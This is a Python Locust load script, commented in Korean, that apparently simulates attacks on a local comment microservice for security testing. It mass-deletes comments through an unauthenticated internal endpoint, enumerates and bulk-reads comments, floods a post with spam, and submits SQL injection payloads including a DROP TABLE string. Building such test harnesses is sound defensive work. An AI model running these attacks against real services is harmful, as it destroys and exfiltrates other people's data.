# attack_comment_locustfile.py — comment-service 공격 트래픽 (C1~C4, attack.md 기준)
#
# 실행:
#   $env:HOST="http://localhost:8081"; $env:AUTH_HOST="http://localhost:8080"; $env:POST_HOST="http://localhost:8082"
#   locust -f attacks/attack_comment_locustfile.py --host http://localhost:8081 \
#          --users 10 --spawn-rate 5 --run-time 120s --headless
#
# env: HOST(comment), AUTH_HOST(auth), POST_HOST(post), ID_RANGE(열거 상한, 기본 300)
# 시퀀스: C1 ★★★(무인증 순차 삭제 — 대표), C2/C3 ★★☆, C4 ★☆☆.

import os
import uuid
import random
import logging

import requests
from locust import HttpUser, task, between

logger = logging.getLogger(__name__)

AUTH_HOST = os.environ.get("AUTH_HOST", "http://localhost:8080")
POST_HOST = os.environ.get("POST_HOST", "http://localhost:8082")
ID_RANGE = int(os.environ.get("ID_RANGE", "300"))

SQLI = ["' OR '1'='1", "'; DROP TABLE comments;--", "' UNION SELECT NULL--"]


def hit(cm):
    with cm as r:
        r.success()


def _get_token():
    u = f"attacker_{uuid.uuid4().hex[:8]}"
    try:
        requests.post(f"{AUTH_HOST}/api/auth/signup", json={
            "username": u, "email": f"{u}@t.local", "password": "Atk@12345!"}, timeout=10)
        r = requests.post(f"{AUTH_HOST}/api/auth/login",
                          json={"username": u, "password": "Atk@12345!"}, timeout=10)
        if r.ok:
            return r.json().get("accessToken")
    except Exception:
        pass
    return None


def _seed_post(token):
    """C3 스팸 표적이 될 게시글 하나 확보(없으면 생성)."""
    h = {"Authorization": f"Bearer {token}"} if token else {}
    try:
        r = requests.get(f"{POST_HOST}/api/posts?page=1&size=1", headers=h, timeout=10)
        if r.ok:
            data = r.json().get("data", [])
            if data:
                return data[0]["postId"]
        r = requests.post(f"{POST_HOST}/api/posts", headers=h,
                          json={"title": "seed", "content": "seed"}, timeout=10)
        if r.ok:
            return r.json().get("postId")
    except Exception:
        pass
    return None


class CommentAttacker(HttpUser):
    host = os.environ.get("HOST", "http://localhost:8081")
    wait_time = between(0.02, 0.2)

    def on_start(self):
        self._token = _get_token()
        self._target_post = _seed_post(self._token)
        self._cursor = 1

    def _auth(self):
        return {"Authorization": f"Bearer {self._token}"} if self._token else {}

    def _next_id(self):
        i = self._cursor
        self._cursor = self._cursor % ID_RANGE + 1
        return i

    # C1 — 댓글 일괄 삭제 (무인증 internal, postId 순회) ★★★ 대표 시나리오
    @task(3)
    def c1_mass_delete_internal(self):
        hit(self.client.delete(f"/internal/posts/{self._next_id()}/comments",
                              name="C1 DELETE /internal/posts/[id]/comments",
                              catch_response=True))

    # C2 — 댓글 exfiltration (postId 순회 커서 조회) ★★☆
    @task(2)
    def c2_exfil(self):
        hit(self.client.get(f"/api/comments/{self._next_id()}/comments?size=50",
                            headers=self._auth(), name="C2 GET /api/comments[bulk]",
                            catch_response=True))

    # C3 — 댓글 스팸 flood (동일 게시글 대량 작성) ★★☆
    @task(2)
    def c3_spam(self):
        if not self._target_post:
            return
        hit(self.client.post(f"/api/comments/{self._target_post}/comments",
                            json={"content": f"spam {uuid.uuid4().hex}"},
                            headers=self._auth(), name="C3 POST /api/comments[spam]",
                            catch_response=True))

    # C4 — 댓글 SQLi 페이로드 ★☆☆
    @task(1)
    def c4_sqli(self):
        pid = self._target_post or 1
        hit(self.client.post(f"/api/comments/{pid}/comments",
                            json={"content": random.choice(SQLI)},
                            headers=self._auth(), name="C4 POST /api/comments[sqli]",
                            catch_response=True))
